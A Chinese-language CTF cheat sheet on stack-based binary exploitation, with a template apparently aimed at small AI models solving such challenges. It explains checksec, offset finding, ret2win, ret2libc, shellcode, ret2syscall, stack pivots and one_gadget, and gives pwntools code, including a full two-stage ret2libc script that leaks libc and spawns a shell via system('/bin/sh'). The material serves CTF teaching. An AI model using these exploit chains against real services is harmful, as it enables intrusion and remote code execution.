# Pwn 基础利用与栈

---

## 1. 做题总流程

```text
file -> checksec -> 运行交互 -> 定位崩溃 -> 算偏移 -> 判断保护 -> 找泄露 -> 选利用链 -> 本地打通 -> 远程适配
```

### 小模型固定输出模板
1. 程序架构：x86 / amd64 / 静态/动态链接
2. 保护：NX / PIE / Canary / RELRO
3. 控制点：栈溢出 / 格式化 / 整数 / UAF
4. 泄露点：puts/printf/show/fmt/read after free
5. 利用链：ret2win / ret2libc / ROP / 栈迁移 / shellcode

---

## 2. 基础信息收集

### 2.1 必查命令
```bash
file ./pwn
checksec --file=./pwn
ldd ./pwn
strings -a -n 4 ./pwn | head -n 50
readelf -a ./pwn | less
objdump -d -Mintel ./pwn | less
```

### 2.2 运行时必问
- 读入函数是什么？`gets/read/fgets/scanf/strcpy`?
- 长度限制是多少？
- 是否 echo 回来？
- 是否有菜单？是否能多次交互？
- 崩溃点在哪：返回地址、栈变量、函数指针？

## 3. checksec 解读

## 3.1 NX
- 开启：栈不可执行，倾向 ROP / ret2libc / ORW
- 关闭：可直接 shellcode

## 3.2 Canary
- 有 canary：要么泄露，要么避开覆盖返回地址
- 无 canary：直接覆盖返回地址更简单

## 3.3 PIE
- 开启：程序基址随机，需要先 leak 程序地址
- 关闭：程序内 gadget / 函数地址固定

## 3.4 RELRO
- Partial RELRO：GOT 常可写
- Full RELRO：GOT 不可改，更多依赖 ROP / hooks / 返回地址

## 4. 偏移定位

### 4.1 cyclic
```python
from pwn import *
print(cyclic(300))
print(cyclic_find(0x6161616c))
```

### 4.2 注意点
- x86 看 EIP，amd64 看 RIP 可能不会直接显示，需要从栈中找模式串
- `fgets` 会保留换行，`scanf("%s")` 遇空白截断
- 远程环境和本地环境 libc 不同时，偏移一般不受影响，但利用地址会不同

## 5. 栈溢出基本类型

## 5.1 ret2win
### 特征
- 程序里有隐藏函数 `win/get_shell/shell/backdoor`
- 无需复杂泄露，只要把返回地址改过去

### 条件
- 可覆盖返回地址
- 函数地址已知或可泄露
- 参数若有要求，需要设置寄存器/栈参数

### amd64 最小思路
```text
padding + ret(对齐可选) + win
```

### x86
```text
padding + win + fake_ret + arg1 + arg2
```

---

## 5.2 ret2libc
### 适用场景
- NX 开启
- 能控制返回地址
- 能 leak libc 函数地址，或给了 libc 文件

### 标准两阶段
1. 泄露某 GOT 实际地址，如 `puts@got`
2. 回到 main
3. 根据 libc 算出 `system` 和 `/bin/sh`
4. 再次溢出调用 `system("/bin/sh")`

### amd64 典型骨架
```python
from pwn import *
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

payload = flat(
    b'A'*offset,
    pop_rdi, puts_got,
    puts_plt,
    main
)
```

### 算地址
```python
leak = u64(io.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))
```

### 栈对齐
某些 glibc 调 `system` 前需要 16 字节对齐，不然崩溃。必要时在链前加单个 `ret`。

---

## 5.3 shellcode
### 适用场景
- NX 关闭，或你能 `mprotect`
- 可控可执行内存地址

### 常见路线
- 栈上 shellcode
- `.bss` 写入 shellcode 再跳转
- ROP 调 `mprotect` 后跳 shellcode

### shellcode 题重点
- 地址是否稳定
- 是否有坏字符
- 是否需要 syscall 版而非 `/bin/sh`
- seccomp 是否限制 `execve`

---

## 5.4 ret2syscall
### 条件
- 有足够 gadget 控制 `rax,rdi,rsi,rdx`
- 可触发 `syscall`
- libc 不可靠 / 静态链接题常见

### amd64 execve
```text
rax=59
rdi=&"/bin/sh"
rsi=0
rdx=0
syscall
```

### 常见做法
- 先写 `/bin/sh\x00` 到 `.bss`
- 再 ROP syscall

---

## 5.5 栈迁移 stack pivot
### 适用场景
- 原溢出空间很小，放不下完整 ROP
- 可控某个栈帧指针或有 `leave; ret`

### 常见思路
- 把长 ROP 链写到 `.bss/heap`
- 覆盖 `rbp` 为伪栈地址
- 跳 `leave; ret`

### `leave; ret` 本质
```text
mov rsp, rbp
pop rbp
ret
```

---

## 5.6 ret2csu
### 适用场景
- amd64、gadget 不全
- 需要一次性控制多个寄存器调用函数

### 思维
利用 `__libc_csu_init` 里成套 gadget 控制 `rdi/rsi/rdx` 并调用函数指针。

### 常用于
- 泄露 read/write/puts
- 调用 read 往 `.bss` 写第二阶段 payload

---

## 6. x86 与 amd64 差异

### 6.1 参数传递
- x86：栈上传参
- amd64：前六个参数走寄存器 `rdi,rsi,rdx,rcx/r10,r8,r9`（syscall 与函数调用略不同）

### 6.2 地址打包
- x86：`p32`
- amd64：`p64`

### 6.3 泄露处理
- amd64 常要 `ljust(8,b'\x00')`
- x86 直接 `u32`

---

## 7. 泄露思路总表

### 7.1 泄露程序基址（PIE）
- 泄露 main / puts@plt / 某全局变量地址
- 用已知符号偏移反推 `elf.address`

### 7.2 泄露 libc
- puts GOT / printf GOT / read GOT
- 泄露 `__libc_start_main` 返回地址
- 格式化字符串直接读栈上 libc 地址

### 7.3 泄露 canary
- 格式化字符串
- 栈回显
- off-by-one 观察崩溃差异
- 某些读取函数能回显超界数据

### 7.4 泄露栈地址
- `%p`
- 回显缓冲区地址
- environ

---

## 8. 栈题高频漏洞

## 8.1 gets / read 长度过大
- 经典溢出

## 8.2 scanf("%s")
- 遇空格截断
- 适合无空字节地址的场景

## 8.3 off-by-one / off-by-null
- 只多写一个字节也能很危险
- 可破坏 saved rbp、堆 chunk size、字符串终止符

## 8.4 整数截断导致 read 长度异常
- 表面上有长度校验，实则类型转换后可绕

## 9. 部分覆盖 partial overwrite

### 场景
- 只能改低 1~2 字节
- ASLR 下高位不变

### 利用思路
- 覆盖返回地址低位跳同页 gadget / win
- 覆盖 GOT 低字节跳邻近函数
- 在 PIE 下若程序基址页内偏移固定，可爆破低字节

### 条件
- 目标地址页对齐关系可预测
- 爆破成本可接受

---

## 10. one_gadget 使用

### 思路
`one_gadget libc.so.6` 找到满足约束即可一跳 getshell。

### 但必须检查
- 栈上某些位置是否为 NULL
- 某些寄存器是否满足约束
- `rsp` 是否可控

### 常见误区
- 只看 gadget 偏移，不看约束
- 本地能打远程不能，多半是约束不满足或 libc 版本不对

## 11. 最小 pwntools 模板

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

if args.REMOTE:
    io = remote('host', 1337)
else:
    io = process('./pwn')
    # gdb.attach(io, 'b *main')

def sla(a,b): io.sendlineafter(a,b)
def sa(a,b): io.sendafter(a,b)
def ru(x): return io.recvuntil(x)

offset = 72

# 1st stage leak
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])
sla(b'> ', payload)

leak = u64(io.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']
log.success(hex(libc.address))

# 2nd stage pwn
ret = rop.find_gadget(['ret'])[0]
payload = flat(
    b'A'*offset,
    ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system']
)
sla(b'> ', payload)
io.interactive()
```

## 12. 故障排查

### 12.1 本地通远程不通
- libc 不同
- 菜单同步错了
- 栈对齐问题
- 远程环境行缓冲 / 输出格式不同
- 地址解析错（多读少读一行）

### 12.2 泄露地址不对
- 泄露的不是函数真实地址而是 plt
- 收取数据时混入提示文本
- 没处理 `\x0a`
- 32/64 位打包解包错

### 12.3 回 main 后第二次崩溃
- 栈被污染
- 程序状态不是初始态
- 某输入只允许一次
- FILE / stdin 状态被破坏

## 13. 最短作战模板

```text
1. 确定偏移
2. 看能否直接 ret2win
3. 不行就找 leak 点
4. 泄露 libc / PIE / canary
5. 选 ret2libc / ROP / syscall
6. 注意对齐与远程差异
```
